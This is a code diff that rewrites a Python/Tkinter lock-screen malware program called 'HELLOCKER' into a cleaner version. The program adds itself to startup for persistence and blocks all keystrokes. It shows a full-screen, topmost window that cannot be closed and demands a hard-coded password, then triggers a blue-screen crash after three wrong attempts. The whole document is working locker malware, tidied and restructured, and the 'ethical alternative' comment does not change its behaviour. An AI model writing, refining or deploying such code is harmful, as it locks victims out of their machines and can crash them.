@@ -1,92 +1,102 @@
-#! /usr/bin python
+#! /usr/bin/env python
 # -*- coding: utf-8 -*-
-
 
 from tkinter import *
 import time
 from tkinter import messagebox
 from functools import partial
- 
-
-from modules import bsod, startup, uninstall
-
 import os
-
 import keyboard
 import sys
+from modules import bsod, startup, uninstall  # Ensure these modules are properly defined elsewhere.
 
-password = "123"
-lock_text = "windows blocked.tobi pizda"
-count = 3
+# Configuration
+PASSWORD = "123"
+LOCK_TEXT = "Windows is locked by HELLOCKER."
+ATTEMPT_LIMIT = 3
 
+# File path for persistence
+FILE_PATH = os.path.abspath(sys.argv[0])
 
+# Add to startup
+try:
+    startup(FILE_PATH)
+except Exception as e:
+    print(f"Error setting up persistence: {e}")
 
-file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
+# Initialize variables
+attempts_left = ATTEMPT_LIMIT
 
-startup(file_path)
+# Functions
+def on_button_click(arg):
+    """Simulates typing a number."""
+    enter_pass.insert(END, arg)
 
-def buton(arg):
-	enter_pass.insert(END, arg)
-def delbuton():
-	enter_pass.delete(-1, END)
+def on_delete_click():
+    """Deletes the last character in the password field."""
+    enter_pass.delete(len(enter_pass.get()) - 1, END)
 
+def on_key_press(key):
+    """Disables keyboard input."""
+    pass  # No functionality; suppressing keyboard input.
 
-def tapp(key):
-	pass
+def check_password():
+    """Checks if the entered password is correct."""
+    global attempts_left
+    if enter_pass.get() == PASSWORD:
+        messagebox.showinfo("HELLOCKER", "UNLOCKED SUCCESSFULLY")
+        uninstall(window)
+    else:
+        attempts_left -= 1
+        if attempts_left == 0:
+            messagebox.showwarning("HELLOCKER", "Number of attempts expired.")
+            bsod()  # Simulates a BSOD; replace this with an ethical alternative.
+        else:
+            messagebox.showwarning("HELLOCKER", f"Wrong password. Attempts remaining: {attempts_left}")
 
-def check():
-	global count
-	if enter_pass.get() == password:
-		messagebox.showinfo("HELLOCKER","UNLOCKED SUCCESSFULLY")
+def on_exit_attempt():
+    """Prevents the user from closing the window."""
+    messagebox.showwarning("HELLOCKER", "Exit is not allowed.")
 
-		uninstall(wind)
-	else:
-		count -= 1
-		if count == 0:
-			messagebox.showwarning("HELLOCKER","number of attempts expired")
-			bsod()
-		else:
-			
-			messagebox.showwarning("HELLOCKER", f"Wrong password. Avalible tries: {count}")
+# GUI setup
+window = Tk()
+window.title("HELLOCKER")
+window.configure(bg="black")
+window.attributes("-fullscreen", True)
+window.protocol("WM_DELETE_WINDOW", on_exit_attempt)
+keyboard.on_press(on_key_press, suppress=True)  # Suppress all key presses.
 
+# GUI components
+Label(window, bg="black", fg="red", text="WINDOWS LOCKED BY HELLOCKER", font="Helvetica 50 bold").pack(pady=20)
+Label(window, bg="black", fg="red", text=LOCK_TEXT, font="Helvetica 30").pack(pady=20)
 
-def exiting():
-	messagebox.showwarning("HELLOCKER","DEATH IS INEVITABLE")
-wind = Tk()
-wind.title("HELLOCKER")
-wind["bg"] = "black"
-UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY HELLOCKER\n\n\n", font="helvetica 75").pack()
-untex = Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
-untex.pack(side=TOP)
+enter_pass = Entry(window, bg="black", fg="red", font="Helvetica 25", show="*")
+enter_pass.pack(pady=20)
 
-keyboard.on_press(tapp, suppress=True)
+Button(window, text="Unlock", padx=40, pady=20, bg="black", fg="red", font="Helvetica 20", command=check_password).pack(pady=20)
 
+# Numeric keypad
+keypad_frame = Frame(window, bg="black")
+keypad_frame.pack()
 
-enter_pass = Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
-enter_pass.pack()
-wind.resizable(0,0)
+buttons = [
+    ("1", 1), ("2", 2), ("3", 3),
+    ("4", 4), ("5", 5), ("6", 6),
+    ("7", 7), ("8", 8), ("9", 9),
+    ("0", 0), ("<", "delete")
+]
 
+for text, value in buttons:
+    if value == "delete":
+        btn = Button(keypad_frame, text=text, padx=20, pady=10, bg="black", fg="red", font="Helvetica 20", command=on_delete_click)
+    else:
+        btn = Button(keypad_frame, text=text, padx=20, pady=10, bg="black", fg="red", font="Helvetica 20", command=partial(on_button_click, text))
+    btn.pack(side=LEFT, padx=5, pady=5)
 
-wind.lift()
-wind.attributes('-topmost',True)
+# Focus management
+window.lift()
+window.attributes("-topmost", True)
+window.after_idle(window.attributes, '-topmost', True)
 
-wind.after_idle(wind.attributes,'-topmost',True)
-wind.attributes('-fullscreen', True)
-button = Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
-button.pack()
-wind.protocol("WM_DELETE_WINDOW", exiting)
-
-button0 = Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=LEFT)
-button1 = Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=LEFT)
-button2 = Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=LEFT)
-button3 = Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=LEFT)
-button4 = Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=LEFT)
-button5 = Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=LEFT)
-button6 = Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=LEFT)
-button7 = Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=LEFT)
-button8 = Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=LEFT)
-button9 = Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=LEFT)
-delbutton = Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=LEFT)
-
-
-wind.mainloop()
+# Run the GUI
+window.mainloop()
